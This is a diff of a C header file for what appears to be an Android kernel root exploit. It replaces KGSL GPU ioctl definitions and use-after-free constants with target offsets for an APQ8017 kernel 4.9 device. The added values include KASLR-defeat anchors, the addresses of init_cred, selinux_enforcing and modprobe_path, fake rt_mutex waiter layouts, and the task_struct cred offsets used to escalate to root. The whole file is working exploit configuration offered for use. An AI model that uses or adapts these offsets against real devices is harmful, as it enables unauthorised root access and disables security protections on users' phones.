@@ -1,103 +1,160 @@
-#ifndef ROOT_SHELL_H
-#define ROOT_SHELL_H
+#ifndef TARGET_H
+#define TARGET_H
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <stdint.h>
-#include <stdbool.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <errno.h>
-#include <pthread.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <sched.h>
-#include <sys/prctl.h>
-#include <signal.h>
-#include <sys/syscall.h>
-#include <linux/perf_event.h>
-#include <asm/unistd.h>
-#include <sys/wait.h>
-#include <signal.h>
-#include <sys/select.h>
-#include <poll.h>
-#include <sys/stat.h>
+/* ── Image base & KASLR ─────────────────────────────────────────────── */
+#define KIMAGE_TEXT_BASE        0xffffff8008080000ULL
+#define KASLR_ALIGN             0x00200000ULL
+#define KASLR_MASK              (KASLR_ALIGN - 1)
 
-#define KGSL_IOC_TYPE 0x09
+/* ── Physical memory layout (APQ8017) ───────────────────────────────── */
+#define P0_PAGE_OFFSET          0xffffff8000000000ULL
+#define P0_PHYS_OFFSET          0x80000000ULL
+#define P0_KERNEL_PHYS_LOAD     0x80080000ULL
+#define P0_KERNEL_PHYS_DELTA    (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
+#define DIRECT_MAP_BASE         P0_PAGE_OFFSET
 
-struct kgsl_gpuobj_alloc {
-    uint64_t size; uint64_t flags; uint64_t va_len;
-    uint64_t mmapsize; unsigned int id;
-    unsigned int metadata_len; uint64_t metadata;
-};
-#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
+/* ── Runtime-measured (TODO: fill in after device measurement) ──────── */
+#define PSELECT_WAITER_WORD_SHIFT   16
+#define SLIDE_PSELECT_WORD_SHIFT    PSELECT_WAITER_WORD_SHIFT
 
-struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
-#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
+/* ── SELinux (4.9: no blob_sizes) ───────────────────────────────────── */
+#define HAVE_SELINUX_BLOB_SIZES     0
+#define SELINUX_HAS_BLOB_SIZES      0
+#define SELINUX_BLOB_SIZES_OFF      0x0ULL
 
-struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
+/* ── Raw image offsets, relative to KIMAGE_TEXT_BASE ───────────────── */
 
-struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
-#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)
+/* Data symbols */
+#define INIT_TASK_OFF               0x1d7ec00ULL
+#define INIT_CRED_OFF               0x1ba9360ULL
+#define ROOT_TASK_GROUP_OFF         0x1ba9900ULL
+#define SELINUX_ENFORCING_OFF       0x1bdf768ULL
+#define SECURITY_HOOK_HEADS_OFF     0x14a0380ULL
+#define FAIR_SCHED_CLASS_OFF        0x1d7f680ULL
+#define KMALLOC_CACHES_OFF          0x1dabc20ULL
+#define ANON_PIPE_BUF_OPS_OFF       0x00f9c800ULL
+#define MODPROBE_PATH_OFF           0x1ba8050ULL
+#define __PER_CPU_OFFSET_OFF        0x1b89020ULL
+#define __ENTRY_TASK_PCPU_OFF       0x16084d0ULL
 
-struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };
+/* ashmem */
+#define ASHMEM_MISC_OFF             0x1ca9cf8ULL
+#define ASHMEM_MISC_FOPS_OFF        0x1ca9d08ULL
+#define ASHMEM_FOPS_OFF             0x18652e8ULL
 
-struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
-#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
+/* Function symbols */
+#define NOOP_LLSEEK_OFF             0x001a99c0ULL
+#define NO_LLSEEK_OFF               0x001a99c8ULL
+#define COPY_SPLICE_READ_OFF        0x001e03f4ULL
 
-struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };
+/* configfs (4.9: read_file/write_file, not read_iter/write_iter) */
+#define CONFIGFS_READ_FILE_OFF      0x0023ebc0ULL
+#define CONFIGFS_WRITE_FILE_OFF     0x0023f154ULL
+#define CONFIGFS_READ_BIN_FILE_OFF  0x0023ece8ULL
+#define CONFIGFS_WRITE_BIN_FILE_OFF 0x0023ee1cULL
+#define CONFIGFS_READ_OFF           CONFIGFS_READ_FILE_OFF
+#define CONFIGFS_WRITE_OFF          CONFIGFS_WRITE_FILE_OFF
+#define CONFIGFS_READ_ITER_OFF      CONFIGFS_READ_FILE_OFF
+#define CONFIGFS_BIN_WRITE_ITER_OFF CONFIGFS_WRITE_BIN_FILE_OFF
 
-struct kgsl_gpu_command {
-    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
-    uint64_t objlist; unsigned int objsize, numobjs;
-    uint64_t synclist; unsigned int syncsize, numsyncs;
-    unsigned int context_id, timestamp;
-};
-#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
+/* ashmem file_operations */
+#define ASHMEM_LLSEEK_OFF           0x00a85a4cULL
+#define ASHMEM_READ_ITER_OFF        0x00a85998ULL
+#define ASHMEM_IOCTL_OFF            0x00a85c40ULL
+#define ASHMEM_COMPAT_IOCTL_OFF     0x00a8625cULL
+#define ASHMEM_MMAP_OFF             0x00a8565cULL
+#define ASHMEM_OPEN_OFF             0x00a855d8ULL
+#define ASHMEM_RELEASE_OFF          0x00a862acULL
 
-struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
-#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
+/* SLIDE anchors for KASLR defeat (OFFSET values) */
+#define SLIDE_NFULNL_LOGGER_OFF     0x1b88708ULL
+#define SLIDE_LOGGERS_0_1_OFF       0x1b90c50ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x1c32470ULL
+#define SLIDE_SYSCTL_BOOTID_OFF     0x0166e4a8ULL
+#define SLIDE_INIT_TASK_OFF         INIT_TASK_OFF
+#define SLIDE_ROOT_TASK_GROUP_OFF   ROOT_TASK_GROUP_OFF
 
-#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
-#define KGSL_CACHEMODE_SHIFT 0
-#define KGSL_CACHEMODE_MASK 3
-#define KGSL_CACHEMODE_UNCACHED 0
-#define KGSL_CACHEMODE_WRITECOMBINE 1
-#define KGSL_CACHEMODE_WRITETHROUGH 2
-#define KGSL_CACHEMODE_WRITEBACK 3
-#define KGSL_USER_MEM_TYPE_ADDR 2
-#define KGSL_CONTEXT_PREAMBLE 0x00000010
-#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
-#define KGSL_CMDLIST_IB 0x00000001U
-#define KGSL_TIMESTAMP_RETIRED 0x00000002
+/* ── Absolute image addresses ────────────────────────────────────────── */
+#define INIT_TASK               (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define INIT_CRED               (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
+#define ROOT_TASK_GROUP         (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define SELINUX_ENFORCING       (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define SECURITY_HOOK_HEADS     (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
+#define FAIR_SCHED_CLASS        (KIMAGE_TEXT_BASE + FAIR_SCHED_CLASS_OFF)
+#define KMALLOC_CACHES          (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+#define ANON_PIPE_BUF_OPS       (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+#define MODPROBE_PATH           (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)
+#define ASHMEM_MISC             (KIMAGE_TEXT_BASE + ASHMEM_MISC_OFF)
+#define ASHMEM_MISC_FOPS        (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS             (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define NOOP_LLSEEK             (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+#define NO_LLSEEK               (KIMAGE_TEXT_BASE + NO_LLSEEK_OFF)
+#define COPY_SPLICE_READ        (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define CONFIGFS_READ_FILE      (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)
+#define CONFIGFS_WRITE_FILE     (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_FILE_OFF)
+#define ASHMEM_LLSEEK           (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_OFF)
+#define ASHMEM_READ_ITER        (KIMAGE_TEXT_BASE + ASHMEM_READ_ITER_OFF)
+#define ASHMEM_IOCTL            (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_COMPAT_IOCTL     (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_MMAP             (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN             (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE          (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
 
-#define UAF_ADDR  0x7001ff000ULL
-#define UAF_SIZE  0x10004000ULL
-#define OVERLAP_ADDR 0x7001fe000ULL
-#define OVERLAP_SIZE 0x7000ULL
-#define BOGUS_ADDR 0x700204000ULL
-#define BOGUS_SIZE 0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x710204000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL
+/* ── IMAGE aliases required by PoC's common.h (for SLIDE) ────────────── */
+#define SLIDE_NFULNL_LOGGER_IMAGE       SLIDE_NFULNL_LOGGER_OFF
+#define SLIDE_LOGGERS_0_1_IMAGE         SLIDE_LOGGERS_0_1_OFF
+#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE SLIDE_RANDOM_BOOT_ID_DATA_OFF
+#define SLIDE_SYSCTL_BOOTID_IMAGE       SLIDE_SYSCTL_BOOTID_OFF
+#define SLIDE_INIT_TASK_IMAGE           SLIDE_INIT_TASK_OFF
+#define SLIDE_ROOT_TASK_GROUP_IMAGE     SLIDE_ROOT_TASK_GROUP_OFF
 
-#define VMLINUX_TEXT      0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
-#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
-#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
+/* ── Exploit layout constants ────────────────────────────────────────── */
+#define LOCK_OFF                0x1350
+#define W0_OFF                  0x2220
+#define FOPS_OFF                0x1000
+#define SCRATCH_OFF             0x3000
+#define FAKE_TASK_OFF           0x3200
+#define WAITER_LOCAL_OFF        0x80
 
-#define CRED_OFF    0x740
-#define REAL_CRED_OFF 0x738
+/* ── rt_mutex struct offsets ─────────────────────────────────────────── */
+#define RTMUTEX_WAIT_LOCK_OFF           0x00
+#define RTMUTEX_WAIT_LOCK_OWNER_CPU_OFF 0x04
+#define RTMUTEX_WAIT_LOCK_OWNER_TASK_OFF 0x08
+#define RTMUTEX_WAITERS_ROOT_OFF        0x10
+#define RTMUTEX_WAITERS_LEFTMOST_OFF    0x18
+#define RTMUTEX_OWNER_OFF               0x20
 
-#define SPRAY_PIDS 2000
-#define SCAN_DWORDS 560
+/* ── rt_mutex_waiter offsets (kernel 4.9 FLAT struct) ──────────────── */
+#define WAITER_TREE_ENTRY_OFF       0x00
+#define WAITER_PI_TREE_ENTRY_OFF    0x18
+#define WAITER_TASK_OFF             0x30
+#define WAITER_LOCK_OFF             0x38
+#define WAITER_PRIO_OFF             0x40
+#define WAITER_DEADLINE_OFF         0x48
+#define FAKE_WAITER_TREE_ENTRY_OFF  WAITER_TREE_ENTRY_OFF
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
+#define FAKE_WAITER_TASK_OFF        WAITER_TASK_OFF
+#define FAKE_WAITER_LOCK_OFF        WAITER_LOCK_OFF
+#define FAKE_WAITER_PRIO_OFF        WAITER_PRIO_OFF
+#define FAKE_WAITER_DEADLINE_OFF    WAITER_DEADLINE_OFF
 
-#define CP_NOP 0x10
-#define CP_MEM_WRITE 0x3D
-#define CP_MEM_TO_MEM 0x73
-#define CP_WAIT_MEM_WRITES 0x12
-#define CP_EVENT_WRITE 0x46
-#define CACHE_FLUSH_TS 0x1C
+/* ── task_struct field offsets ───────────────────────────────────────── */
+#define TASK_PRIO_OFF               0x70
+#define TASK_REAL_PARENT_OFF        0x688
+#define TASK_PIDS_OFF               0x6f0
+#define TASK_REAL_CRED_OFF          0x830
+#define TASK_CRED_OFF               0x838
+#define TASK_COMM_OFF               0x8f0
+#define TASK_PI_LOCK_OFF            0x8f4
+#define TASK_PI_WAITERS_OFF         0x8f8
+#define TASK_PI_BLOCKED_ON_OFF      0x910
 
-#endif
+/* ── FAKE_TASK field offsets ────────────────────────────────────────── */
+#define FAKE_TASK_PRIO_OFF          TASK_PRIO_OFF
+#define FAKE_TASK_PI_LOCK_OFF       TASK_PI_LOCK_OFF
+#define FAKE_TASK_PI_WAITERS_OFF    TASK_PI_WAITERS_OFF
+#define FAKE_TASK_PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON_OFF
+#define FAKE_TASK_REAL_CRED_OFF     TASK_REAL_CRED_OFF
+#define FAKE_TASK_CRED_OFF          TASK_CRED_OFF
+
+#endif /* TARGET_H */
